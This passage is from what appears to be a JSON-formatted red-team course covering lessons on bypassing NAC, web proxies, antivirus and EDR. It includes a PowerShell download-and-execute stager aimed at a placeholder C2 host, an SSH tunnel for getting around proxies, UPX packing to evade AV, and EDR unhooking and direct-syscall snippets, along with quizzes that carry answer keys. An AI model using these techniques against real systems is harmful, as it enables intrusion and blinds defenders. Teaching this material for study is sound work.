            "id": "lesson-6",
            "title": "Bypassing Network Access Control (NAC)",
            "duration": "60 min",
            "objectives": [
                "Understand how NAC solutions work (802.1X, MAC filtering)",
                "Learn how to perform MAC address spoofing",
                "Explore techniques for exploiting whitelisted or un-monitored devices",
                "Identify unprotected network segments or ports",
                "Practice spoofing a MAC address to bypass a filter"
            ],
            "content": {
                "overview": "Network Access Control (NAC) solutions are designed to be the gatekeepers of the network, preventing unauthorized devices from connecting. This lesson covers the common techniques used by attackers to circumvent these controls, from simple MAC spoofing to finding and abusing unprotected ports.",
                "sections": [
                    {
                        "title": "How NAC Works",
                        "content": "<p>NAC solutions aim to enforce policy on devices that try to connect to a network. The goal is to ensure that only authorized and compliant devices are allowed on.</p><h3>Common Methods:</h3><ul><li><strong>MAC Filtering:</strong> The most basic form of NAC. The network switch maintains a list of allowed MAC addresses. Only devices with a MAC address on the list are allowed to connect.</li><li><strong>802.1X Port-Based Authentication:</strong> A much more robust standard. When a device connects, the switch puts the port in an unauthorized state. The device must then authenticate using a supplicant (software client) that talks to an authentication server (like RADIUS). If authentication is successful, the port is opened.</li></ul>",
                        "image": "https://i.imgur.com/u7y7o9o.png"
                    },
                    {
                        "title": "MAC Address Spoofing",
                        "content": "<p>Bypassing a simple MAC filtering solution is trivial. A MAC address is a unique identifier for a network interface card, but it is easily changed in software. This is called <strong>MAC spoofing</strong>.</p><p>An attacker can first discover the MAC address of a legitimate, whitelisted device (e.g., by sniffing the network or looking at a label on a device like a printer). They can then simply change their own attacking machine's MAC address to match the trusted one. The network switch will now see the attacker's machine as the legitimate device and grant it access to the network.</p>",
                        "image": "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Exploiting Unprotected Segments",
                        "content": "<p>NAC is often difficult and expensive to deploy across an entire organization. As a result, it is often only enabled on the main corporate user segments. An attacker can look for parts of the network where NAC is not enforced.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Finding the Weakest Link</strong></div><p>An attacker performing a physical assessment might find an active but unprotected network port in a conference room or a lobby. They might also target less-secure network segments, such as those for IoT devices (like security cameras) or printers, which are sometimes not covered by the main NAC policy. Gaining access to one of these less-secure segments can provide a crucial initial foothold.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "macchanger -r eth0",
                    "language": "bash",
                    "code": "# The 'macchanger' tool on Linux is used to view and change a NIC's MAC address.\n\n# View the current MAC address of the eth0 interface\nmacchanger -s eth0\n\n# --- Sample Output ---\n# Current MAC:   00:11:22:33:44:55 (Unknown)\n# Permanent MAC: 00:11:22:33:44:55 (Unknown)\n\n# Spoof the MAC address to a specific, trusted one\nmacchanger --mac 00:AA:BB:CC:DD:EE eth0\n\n# Spoof the MAC address to a random one\n# This is useful to avoid being tracked, but less useful for bypassing a filter.\nmacchanger -r eth0"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of a Network Access Control (NAC) solution?",
                        "options": [
                            "To scan for viruses.",
                            "To prevent unauthorized and non-compliant devices from connecting to the network.",
                            "To filter web traffic.",
                            "To monitor network performance."
                        ],
                        "correct": 1,
                        "explanation": "NAC acts as a gatekeeper at the very edge of the network, trying to ensure that only trusted devices are allowed to join."
                    },
                    {
                        "id": 2,
                        "question": "What is MAC spoofing?",
                        "options": [
                            "A type of network protocol.",
                            "The process of changing a network interface's MAC address in software to impersonate a legitimate device.",
                            "A hardware attack.",
                            "A method for encrypting traffic."
                        ],
                        "correct": 1,
                        "explanation": "MAC addresses are not a strong security control because they can be easily changed ('spoofed'). This is the primary technique for bypassing simple MAC filtering."
                    },
                    {
                        "id": 3,
                        "question": "Which of the following is a common strategy for bypassing a NAC implementation in a corporate building?",
                        "options": [
                            "Trying to guess the Wi-Fi password.",
                            "Plugging into an unprotected network port in a public area like a conference room or lobby.",
                            "Launching a denial-of-service attack against the NAC server.",
                            "Sending a phishing email."
                        ],
                        "correct": 1,
                        "explanation": "NAC deployments are often incomplete. A physical attacker will almost always search for unprotected ports in common areas, as these are frequently overlooked and provide an easy way onto the network."
                    }
                ]
            }
        },
        {
            "id": "lesson-7",
            "title": "Bypassing Web Proxies and Secure Web Gateways (SWG)",
            "duration": "75 min",
            "objectives": [
                "Understand how web proxies perform category-based filtering",
                "Learn how to use domain fronting to bypass filtering",
                "Explore the use of SSH tunneling to create an encrypted channel",
                "Analyze how uncategorized websites can be abused"
            ],
            "content": {
                "overview": "For most employees, all web traffic is routed through a web proxy or Secure Web Gateway (SWG) that filters content and blocks access to malicious sites. This lesson covers the techniques that an attacker (or a red teamer emulating an internal threat) can use to bypass these controls and establish a C2 channel.",
                "sections": [
                    {
                        "title": "How Web Proxies Work",
                        "content": "<p>A <strong>web proxy</strong> acts as an intermediary for all outbound web traffic. It can enforce security policies by:</p><ul><li><strong>Category Filtering:</strong> Blocking access to websites based on their category (e.g., 'Gambling', 'Social Media', 'Malicious'). The proxy vendor maintains a massive database to categorize domains.</li><li><strong>Content Inspection:</strong> For HTTPS traffic, if SSL/TLS interception is enabled, the proxy can decrypt and scan the content for malware or data exfiltration.</li></ul><p>An attacker's beacon traffic must be able to bypass these filters.</p>",
                        "image": "https://i.imgur.com/fgS4fG3.png"
                    },
                    {
                        "title": "Domain Fronting",
                        "content": "<p><strong>Domain fronting</strong> is a powerful technique for bypassing category-based filters. The attacker's C2 server is hosted on a large, trusted cloud platform or CDN (like Google or CloudFront) that is categorized as 'trusted' or 'business'.</p><p>The C2 beacon sends its HTTPS request to a high-reputation domain on that same CDN. The web proxy sees a connection to a legitimate, allowed domain and lets it through. However, the `Host` header inside the encrypted request tells the CDN to route the traffic to the attacker's endpoint. The proxy only sees the 'front' domain, not the true destination.</p>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "SSH Tunneling",
                        "content": "<p>If an attacker can find a way to make an outbound <strong>SSH</strong> connection (on port 22), they can bypass the web proxy entirely for any protocol. SSH has a powerful feature called a <strong>dynamic port forward</strong> (or SOCKS proxy).</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Creating an Encrypted Tunnel</strong></div><p>An attacker can run a command on the compromised host to create an encrypted SSH tunnel to a server they control on the internet. They can then configure their tools (or the system's proxy settings) to send all of their traffic through this local SOCKS proxy. The traffic will be encrypted, tunneled over the SSH connection, and will pop out on the attacker's internet server, completely bypassing the corporate web proxy and its filters.</p></div>",
                        "image": "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "ssh -D 8080 -C -N user@proxyserver",
                    "language": "bash",
                    "code": "# This command establishes an SSH tunnel that can be used to bypass a web proxy.\n\n# ssh: The SSH client.\n# -D 8080: Create a dynamic application-level port forward (SOCKS proxy) on local port 8080.\n# -C: Enable compression.\n# -N: Do not execute a remote command. Just set up the tunnel.\n# user@proxyserver: The attacker's external server.\n\n# After running this command, the attacker can configure their web browser or other tools\n# on the compromised machine to use 'localhost:8080' as a SOCKS5 proxy.\n# All traffic sent to this proxy will be securely tunneled over SSH to the internet."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary function of a Secure Web Gateway (SWG)?",
                        "options": [
                            "To act as a router.",
                            "To host a company's website.",
                            "To filter outbound web traffic based on category and scan for threats.",
                            "To manage user accounts."
                        ],
                        "correct": 2,
                        "explanation": "An SWG is a preventive control that acts as an intermediary for all web traffic, enforcing security policies and blocking access to malicious or unauthorized sites."
                    },
                    {
                        "id": 2,
                        "question": "What is the core idea behind 'domain fronting'?",
                        "options": [
                            "To buy a domain name.",
                            "To hide the true destination of C2 traffic by making it look like it's going to a high-reputation domain hosted on the same CDN.",
                            "To create a fake website.",
                            "To attack a DNS server."
                        ],
                        "correct": 1,
                        "explanation": "Domain fronting abuses the routing logic of CDNs. The defender sees traffic going to `google.com` (which is allowed), but the CDN forwards it to the attacker's C2 endpoint, making the traffic very hard to block."
                    },
                    {
                        "id": 3,
                        "question": "How does SSH tunneling help an attacker bypass a web proxy?",
                        "options": [
                            "It doesn't.",
                            "By creating a direct, encrypted channel to an attacker-controlled server on the internet, which bypasses the proxy and its filters entirely.",
                            "By making web traffic slower.",
                            "By sending traffic over port 80."
                        ],
                        "correct": 1,
                        "explanation": "An SSH tunnel provides a raw, encrypted pipe out of the network. Any traffic sent through this pipe is invisible to the web proxy, making it a powerful bypass technique if outbound SSH is allowed."
                    }
                ]
            }
        },
        {
            "id": "lesson-8",
            "title": "Bypassing Signature-Based Antivirus (AV)",
            "duration": "75 min",
            "objectives": [
                "Understand how AV signatures work (hashes, byte patterns)",
                "Learn how to use packers and crypters to change file signatures",
                "Explore the concept of polymorphic and metamorphic code",
                "Practice using a packer to make a known malware sample undetectable"
            ],
            "content": {
                "overview": "The most basic endpoint defense is the traditional signature-based antivirus. While modern security has moved beyond signatures, they are still a foundational layer. This lesson covers the classic and still-effective techniques that attackers use to modify their payloads to evade these static, signature-based detections.",
                "sections": [
                    {
                        "title": "How AV Signatures Work",
                        "content": "<p>A signature-based AV works by maintaining a large database of signatures for known malware.</p><h3>Signature Types:</h3><ul><li><strong>File Hashes:</strong> The AV calculates the cryptographic hash (e.g., MD5 or SHA-256) of a file and compares it to a blacklist of known bad hashes. This is the simplest but most brittle type of signature.</li><li><strong>Byte Patterns (String Signatures):</strong> The AV vendor identifies a unique sequence of bytes within a malware file and creates a signature for it. The AV scanner then looks for this byte sequence in all scanned files.</li></ul>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Packers and Crypters",
                        "content": "<p>To bypass these signatures, attackers use tools that modify their executables.</p><ul><li><strong>Packers:</strong> A tool like UPX compresses the original executable and wraps it in a small decompression stub. The resulting file has a completely different structure and hash, but it still runs correctly.</li><li><strong>Crypters:</strong> A crypter goes a step further by encrypting the original executable. The output file consists of the encrypted payload and a decryption stub. This is a very effective way to defeat static signature analysis, as the malicious code is completely hidden until it is decrypted in memory.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Polymorphic and Metamorphic Code",
                        "content": "<p>These are more advanced, automated techniques.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Automated Evasion</strong></div><p><ul><li><strong>Polymorphic Code:</strong> The malware uses an encryption engine to encrypt its main body with a different key each time it infects a new machine. The decryption stub remains the same. This means all infected files will look different, but the decryption logic can still be a point of detection. (e.g., Metasploit's `shikata_ga_nai` encoder).</li><li><strong>Metamorphic Code:</strong> The most advanced technique. The malware rewrites its own code entirely with each new infection. It changes its structure, uses equivalent but different instructions, and inserts junk code. There is no common signature to find.</li></ul></p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Using_UPX_to_Pack_an_Executable.sh",
                    "language": "bash",
                    "code": "# UPX is a popular, open-source executable packer.\n\n# Assume 'malware.exe' is a file that is detected by our AV.\n# We can check its hash first.\nsha256sum malware.exe\n# > 123abc...  (Detected by AV)\n\n# Use UPX to pack the executable. The '--best' flag is for maximum compression.\nupx --best -o malware_packed.exe malware.exe\n\n# Check the hash of the new file. It will be completely different.\nsha256sum malware_packed.exe\n# > 456def... (May now be undetected by AV)\n\n# The packed file still runs and functions exactly like the original."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "If you change a single byte in a malware file, what happens to its SHA-256 hash?",
                        "options": [
                            "Nothing.",
                            "The hash changes completely.",
                            "The hash becomes shorter.",
                            "The hash becomes longer."
                        ],
                        "correct": 1,
                        "explanation": "This is a core property of cryptographic hashes called the 'avalanche effect'. Any small change to the input results in a completely different hash, which is why hash-based signatures are so easy to bypass."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary purpose of a 'crypter'?",
                        "options": [
                            "To make a file run faster.",
                            "To encrypt a payload to hide it from static analysis and signature-based AV.",
                            "To add new features to a program.",
                            "To deliver a file to a victim."
                        ],
                        "correct": 1,
                        "explanation": "A crypter is an evasion tool. Its goal is to make a malicious file look like random, encrypted data so that signature scanners cannot find any known bad patterns within it."
                    },
                    {
                        "id": 3,
                        "question": "Which is the more advanced and harder-to-detect technique?",
                        "options": [
                            "Polymorphic code",
                            "Metamorphic code",
                            "Static code",
                            "Encoded code"
                        ],
                        "correct": 1,
                        "explanation": "Metamorphism is more advanced because the malware engine rewrites its entire structure with each infection, meaning there is no single decryption stub that defenders can write a signature for."
                    }
                ]
            }
        },
        {
            "id": "lesson-9",
            "title": "Bypassing Heuristic and Behavioral AV",
            "duration": "75 min",
            "objectives": [
                "Understand how modern AV analyzes program behavior",
                "Explore the concept of in-memory execution or 'fileless' attacks",
                "Learn how to use Process Injection to hide malicious code in a legitimate process",
                "Analyze the use of 'Living off the Land' Binaries (LOLBins) to evade detection"
            ],
            "content": {
                "overview": "Modern antivirus and EDR solutions have moved beyond static signatures to behavioral detection. They look at what a program *does*, not just what it *is*. This lesson covers the advanced techniques attackers use to evade these more sophisticated behavioral defenses, primarily by hiding their actions inside legitimate processes.",
                "sections": [
                    {
                        "title": "In-Memory Execution ('Fileless' Attacks)",
                        "content": "<p>A key way to evade defenses that focus on scanning files is to avoid writing your main payload to the disk at all. The initial stager (e.g., a PowerShell script run from a macro) can download the C2 implant from the internet and execute it directly in memory.</p><p>Because the main malicious payload is never written to a file, a security product that relies on scanning files on the disk will be completely blind to it. This forces the defender to rely on memory scanning and behavioral analysis of the running process (e.g., PowerShell.exe).</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Process Injection",
                        "content": "<p><strong>Process injection</strong> is a powerful technique for evading both application whitelisting and behavioral detection. The attacker starts a legitimate, trusted process (like `explorer.exe` or `svchost.exe`) and then uses a series of Windows API calls to allocate memory inside that process, write their shellcode into it, and then execute it.</p><p>From the perspective of a security product, the malicious code is not running in a new, suspicious process. It is running as a thread inside a legitimate, trusted Windows process. This makes it much harder to detect. There are many different types of process injection, such as DLL injection and process hollowing.</p>",
                        "image": "https://i.imgur.com/F0f5d8g.png"
                    },
                    {
                        "title": "Living off the Land Binaries (LOLBins)",
                        "content": "<p>The ultimate behavioral bypass is to use the operating system's own legitimate tools to perform malicious actions. These trusted, signed system binaries are known as <strong>LOLBins</strong>.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Hiding in Plain Sight</strong></div><p>An attacker can use PowerShell to download files, use the built-in `certutil.exe` to decode a payload, and use `rundll32.exe` to execute it. From a defender's perspective, they don't see any strange or malicious executables running. All they see are legitimate, signed Microsoft binaries doing things they are designed to do. Detecting this requires a very sophisticated EDR that can understand the *context* of these actions and recognize when they are being used for a malicious purpose.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "powershell -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')",
                    "language": "powershell",
                    "code": "# This is a classic 'fileless' attack stager.\n\n# powershell.exe: The legitimate PowerShell binary.\n# -exec bypass: A flag to bypass the execution policy.\n# IEX (Invoke-Expression): A PowerShell command that executes a string as code.\n# (New-Object Net.WebClient).DownloadString(...): This is the core. It downloads the content\n# of 'payload.ps1' from the attacker's server directly into memory as a string.\n\n# The entire script is downloaded and executed in memory without ever touching the disk.\n# This will bypass a simple AV that only scans files."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary advantage of a 'fileless' attack for an attacker?",
                        "options": [
                            "It is easier to program.",
                            "It runs faster.",
                            "By avoiding writing the malicious payload to the disk, it can bypass security tools that only perform static file scanning.",
                            "It uses less memory."
                        ],
                        "correct": 2,
                        "explanation": "Fileless attacks are designed to evade static defenses. If there's no file on disk, there's nothing for a traditional AV to scan, forcing the defender to rely on more advanced behavioral and memory analysis."
                    },
                    {
                        "id": 2,
                        "question": "What is the goal of a process injection attack?",
                        "options": [
                            "To crash a legitimate process.",
                            "To hide malicious code by running it inside of a legitimate, trusted process.",
                            "To make a process run faster.",
                            "To debug a process."
                        ],
                        "correct": 1,
                        "explanation": "Process injection is a powerful evasion technique. It makes the malicious code's activity appear to be coming from a trusted process (like the web browser), which is a significant challenge for behavioral detection."
                    },
                    {
                        "id": 3,
                        "question": "What is a 'LOLBin'?",
                        "options": [
                            "A type of malware.",
                            "A legitimate, signed system binary (like PowerShell) that can be abused by an attacker to perform malicious actions.",
                            "A security product.",
                            "A file format."
                        ],
                        "correct": 1,
                        "explanation": "Living Off the Land Binaries are a key part of modern tradecraft. By using the OS's own tools, attackers can bypass application whitelisting and make their activity much harder to distinguish from legitimate administrative behavior."
                    }
                ]
            }
        },
        {
            "id": "lesson-10",
            "title": "Introduction to Bypassing Endpoint Detection & Response (EDR)",
            "duration": "75 min",
            "objectives": [
                "Understand how EDRs differ from traditional AV (telemetry, API hooking)",
                "Learn how to identify EDRs and their hooks on a system",
                "Explore the concept of user-land vs. kernel-land visibility",
                "Analyze a process with tools like Process Hacker to identify injected DLLs"
            ],
            "content": {
                "overview": "Endpoint Detection & Response (EDR) is the current state-of-the-art in endpoint security. Unlike AV, which focuses on prevention, EDR is designed for detection and response. This introductory lesson covers how EDRs work at a high level, focusing on the core mechanism of API hooking, which is the primary target for an attacker's evasion techniques.",
                "sections": [
                    {
                        "title": "How EDRs Differ from AV",
                        "content": "<p>An EDR is fundamentally a data collection and analysis tool. Its sensor, which runs on the endpoint, gathers a massive amount of telemetry about everything that is happening on the system:</p><ul><li>Process creations and command lines</li><li>Network connections</li><li>File writes and registry modifications</li><li>API calls</li></ul><p>This telemetry is streamed to a central cloud platform where it can be analyzed by AI models and human threat hunters to find the subtle signs of an attack that a traditional AV would miss.</p>",
                        "image": "https://i.imgur.com/kYq3Q6k.png"
                    },
                    {
                        "title": "User-Land API Hooking",
                        "content": "<p>A primary way that EDRs collect this telemetry is through <strong>user-land API hooking</strong>. When a process starts, the EDR's sensor injects its own DLL (Dynamic Link Library) into the process's address space.</p><p>This DLL then overwrites the first few bytes of critical Windows functions (e.g., in `ntdll.dll`) with a `JMP` (jump) instruction that redirects execution to the EDR's own analysis function. This allows the EDR to inspect every call to that function, log it, and then jump back to the original function to let it execute normally. This is how an EDR can see every file that is opened or every process that is created.</p>",
                        "image": "https://i.imgur.com/F0f5d8g.png"
                    },
                    {
                        "title": "Identifying EDR Hooks",
                        "content": "<p>For an attacker, the first step to bypassing an EDR is identifying that it's there and understanding how it works. Tools like <strong>Process Hacker</strong> can be used to inspect a process's memory and look for signs of hooking.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Spotting the Hooks</strong></div><p>An operator can use Process Hacker to look at the memory of a common process like `notepad.exe`. If they inspect the `ntdll.dll` module in memory, they can see the machine code for the functions. If the first instruction of a function is a `JMP` to another, unknown DLL instead of the normal function prologue, that is a clear sign that an EDR has hooked that function. This tells the attacker which functions they need to bypass.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "List_DLLs_Loaded_in_a_Process.ps1",
                    "language": "powershell",
                    "code": "# This PowerShell command can be used to list all the DLLs loaded into a specific process.\n# An attacker can use this to look for the presence of an EDR's DLL.\n\n# First, find the Process ID (PID) of Notepad\n$processId = (Get-Process -Name notepad).Id\n\n# Get a list of all modules (DLLs) loaded by that process\nGet-Process -Id $processId -Module\n\n# --- Sample Output ---\n#    Size(K) ModuleName                                FileVersion\n#    ------ ----------                                ----------- \n#      1640 notepad.exe                             10.0.19041.1\n#      2036 ntdll.dll                               10.0.19041.1288\n#       752 KERNEL32.DLL                            10.0.19041.1288\n#      2908 KERNELBASE.dll                          10.0.19041.1288\n#       188 edr_sensor.dll                          5.2.1.88         <-- Suspicious DLL!"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary function of an EDR solution?",
                        "options": [
                            "To prevent all malware from executing.",
                            "To collect and analyze detailed system telemetry to detect and respond to threats.",
                            "To act as a firewall.",
                            "To manage user passwords."
                        ],
                        "correct": 1,
                        "explanation": "EDR is focused on detection and response. It assumes prevention will sometimes fail and provides the deep visibility needed to find and investigate a compromise after it has happened."
                    },
                    {
                        "id": 2,
                        "question": "What is 'API hooking'?",
                        "options": [
                            "A programming error.",
                            "A technique where an EDR intercepts calls to system functions to monitor process behavior.",
                            "A type of network attack.",
                            "A method for speeding up API calls."
                        ],
                        "correct": 1,
                        "explanation": "API hooking is a primary mechanism for EDRs to get visibility. By placing a hook, the EDR gets to inspect the function call before the OS does, which is how it detects suspicious behavior like process injection."
                    },
                    {
                        "id": 3,
                        "question": "How can an attacker use a tool like Process Hacker to identify an EDR?",
                        "options": [
                            "By looking for high CPU usage.",
                            "By inspecting a process's loaded DLLs and memory for the presence of the EDR's sensor and its hooks.",
                            "By checking the file system for the EDR's installation directory.",
                            "By looking at the network connections."
                        ],
                        "correct": 1,
                        "explanation": "Process Hacker allows an operator to look 'under the hood' of a running process. Finding an unknown DLL loaded into every process, or seeing that the standard Windows functions have been modified in memory, are classic signs of an EDR."
                    }
                ]
            }
        },
        {
            "id": "lesson-11",
            "title": "Advanced EDR Evasion: API Unhooking",
            "duration": "75 min",
            "objectives": [
                "Understand the concept of user-land API hooking in detail",
                "Learn how an EDR modifies a function's prologue in memory",
                "Explore the technique of restoring the original function bytes to unhook the EDR",
                "Analyze the risks and complexities of in-memory patching",
                "Run a proof-of-concept tool to demonstrate unhooking"
            ],
            "content": {
                "overview": "If an EDR's primary method of seeing our actions is by hooking functions in memory, then a powerful evasion is to simply remove those hooks. This lesson covers the advanced technique of API unhooking, where an attacker's implant can surgically remove an EDR's sensors from its own process, effectively blinding it.",
                "sections": [
                    {
                        "title": "The EDR's Hook",
                        "content": "<p>When an EDR hooks a function (e.g., `NtCreateFile` in `ntdll.dll`), it modifies the first few bytes of that function in the process's memory. Normally, the function starts with a standard set of instructions. The EDR overwrites these with a `JMP` (jump) instruction to its own monitoring code.</p><p>The goal of unhooking is to reverse this. The attacker's code needs to find the original, clean version of `ntdll.dll` from disk and use it to restore the correct bytes to the beginning of the hooked function in memory.</p>",
                        "image": "https://i.imgur.com/F0f5d8g.png"
                    },
                    {
                        "title": "The Unhooking Process",
                        "content": "<p>A common technique for unhooking is as follows:</p><ol><li>The implant gets a handle to the `ntdll.dll` file on disk. This version is clean and unhooked.</li><li>It maps this clean version into its own process memory as a new, read-only section.</li><li>It iterates through the functions in the *hooked* version of `ntdll.dll` (the one currently running).</li><li>For each function, it checks if the first instruction is a `JMP`. If it is, this indicates a hook.</li><li>If a hook is found, the implant finds the corresponding function in the *clean* version of `ntdll.dll` that it loaded from disk.</li><li>It then overwrites the hooked function's first few bytes with the original, clean bytes.</li></ol><p>After this process, all the EDR's hooks have been removed from the implant's process, and it can now call Windows APIs without being monitored (by user-land hooks).</p>",
                        "image": "https://i.imgur.com/u7nL6Xk.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "Demonstrating_NTDLL_Unhooking_PoC.c",
                        "language": "c",
                        "code": "// This is a highly simplified, conceptual C++ snippet showing the core idea.\n#include <Windows.h>\n\nvoid unhookNtdll() {\n    // 1. Get a handle to the clean ntdll.dll on disk\n    HANDLE hFile = CreateFileA(\"c:\\\\windows\\\\system32\\\\ntdll.dll\", ...);\n    HANDLE hMapping = CreateFileMapping(hFile, ...);\n    LPVOID cleanNtdllBase = MapViewOfFile(hMapping, ...);\n\n    // 2. Get the base address of the hooked ntdll in our own process\n    HMODULE hookedNtdllBase = GetModuleHandleA(\"ntdll.dll\");\n\n    // 3. Find the .text section of both modules (where the code is)\n    // ... (code to parse PE headers to find the .text section) ...\n\n    // 4. Overwrite the hooked .text section with the clean one\n    // WARNING: This is a simplified and unstable method. Real tools do this\n    // function by function.\n    DWORD oldProtect;\n    VirtualProtect(hookedTextSection, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);\n    memcpy(hookedTextSection, cleanTextSection, textSize);\n    VirtualProtect(hookedTextSection, textSize, oldProtect, &oldProtect);\n\n    // After this, the hooks in ntdll are gone from our process.\n}"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the goal of API unhooking?",
                        "options": [
                            "To make the EDR run faster.",
                            "To remove the EDR's monitoring hooks from a process's memory, effectively blinding it.",
                            "To install new hooks.",
                            "To crash the EDR."
                        ],
                        "correct": 1,
                        "explanation": "Unhooking is a direct countermeasure to the EDR's primary user-land monitoring mechanism. By removing the hooks, the attacker's process can operate without the EDR's sensor seeing its API calls."
                    },
                    {
                        "id": 2,
                        "question": "Where does an unhooking tool get the 'clean' version of a function's original bytes from?",
                        "options": [
                            "It guesses them.",
                            "From another process.",
                            "From the EDR itself.",
                            "From a fresh copy of the DLL file on disk (e.g., `ntdll.dll`)."
                        ],
                        "correct": 3,
                        "explanation": "The DLL file on disk is the ground truth. It is clean and unmodified. The unhooking process uses this clean copy as a template to repair the version that has been hooked in memory."
                    },
                    {
                        "id": 3,
                        "question": "An EDR's API hook typically replaces the first few bytes of a function with what?",
                        "options": [
                            "Random data.",
                            "A `JMP` (jump) instruction to the EDR's own analysis code.",
                            "A `RET` (return) instruction.",
                            "A series of `NOP` (no operation) instructions."
                        ],
                        "correct": 1,
                        "explanation": "The `JMP` instruction is the mechanism for redirection. It hijacks the execution flow, sending it to the EDR's code before it proceeds to the original function. The goal of unhooking is to remove this `JMP`."
                    }
                ]
            }
        },
        {
            "id": "lesson-12",
            "title": "Advanced EDR Evasion: Direct System Calls",
            "duration": "75 min",
            "objectives": [
                "Understand the difference between user-mode APIs and kernel-mode system calls",
                "Learn how direct system calls can bypass user-land EDR hooks",
                "Explore tools like SysWhispers2 for generating syscall stubs",
                "Analyze the trade-offs and complexities of this technique"
            ],
            "content": {
                "overview": "If unhooking is the process of removing the EDR's sensors, direct system calls are the process of sneaking past them without touching them at all. This lesson covers the advanced technique of bypassing user-land API hooks entirely by communicating directly with the Windows kernel.",
                "sections": [
                    {
                        "title": "User-Mode vs. Kernel-Mode",
                        "content": "<p>A Windows application runs in <strong>user-mode</strong>. The core of the operating system runs in <strong>kernel-mode</strong>. When an application wants to do something sensitive (like open a file), it can't do it directly. It has to ask the kernel.</p><p>It does this by using a high-level function in a user-land DLL like `kernel32.dll` (e.g., `CreateFileA`). This function is just a wrapper that eventually calls a lower-level function in `ntdll.dll` (e.g., `NtCreateFile`). The `ntdll` function then executes a special instruction (`syscall`) to transition into the kernel and ask it to perform the action. EDRs typically place their hooks on the `ntdll.dll` functions.</p>",
                        "image": "https://i.imgur.com/kYq3Q6k.png"
                    },
                    {
                        "title": "The Direct System Call Technique",
                        "content": "<p>The core idea of this bypass is simple: if the EDR's hook is on `NtCreateFile` in `ntdll.dll`, then let's not call `NtCreateFile`. Let's just execute the `syscall` instruction ourselves.</p><p>An attacker's malware can be written to manually prepare the CPU registers with the correct arguments for the system call and then execute the `syscall` instruction directly. From the perspective of the user-land EDR, the call to `NtCreateFile` never happened. The request goes straight from the attacker's code to the kernel, completely bypassing the EDR's hook.</p>",
                        "image": "https://i.imgur.com/u7nL6Xk.png"
                    },
                    {
                        "title": "Tools like SysWhispers2",
                        "content": "<p>Implementing this manually is complex, as the exact system call numbers can change between Windows versions. Tools like <strong>SysWhispers2</strong> automate this process.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Automating the Bypass</strong></div><p>SysWhispers2 is a tool that automatically finds the correct syscall numbers for the target version of Windows. It then generates a header file and an assembly file containing all the necessary 'stubs' to make these direct calls. A malware developer can simply include these files in their project and call the direct syscall functions instead of the standard Windows API functions. This provides a powerful and semi-automated way to bypass user-land API hooking.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Using_SysWhispers2_to_Generate_Syscall_Headers.py",
                    "language": "python",
                    "code": "# SysWhispers2 is a Python script that generates the necessary C/ASM files.\n# An operator would run this before compiling their malware.\n\npython3 syswhispers.py --preset all --out-file syscalls\n\n# This command will generate two files: syscalls.c and syscalls.h\n\n# --- In the malware source code (C/C++) ---\n# The developer includes the generated header\n#include \"syscalls.h\"\n\n// Instead of calling the standard, hooked Windows API function:\n// OpenProcess(...);\n\n// The attacker calls the direct syscall wrapper provided by SysWhispers2.\n// This will execute the underlying system call directly, bypassing any user-land hooks.\nNtOpenProcess(...);"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "EDR products typically place their user-land hooks in which DLL?",
                        "options": [
                            "kernel32.dll",
                            "user32.dll",
                            "ntdll.dll",
                            "msvcrt.dll"
                        ],
                        "correct": 2,
                        "explanation": "`ntdll.dll` is the lowest-level user-land library that provides the interface to the kernel's system calls. This makes it the most logical and common place for EDRs to place their hooks for monitoring."
                    },
                    {
                        "id": 2,
                        "question": "What is the core idea of a direct system call bypass?",
                        "options": [
                            "To unhook the EDR's sensor.",
                            "To execute the `syscall` instruction directly to communicate with the kernel, bypassing the hooked user-land API functions in `ntdll.dll`.",
                            "To call functions in `kernel32.dll` instead.",
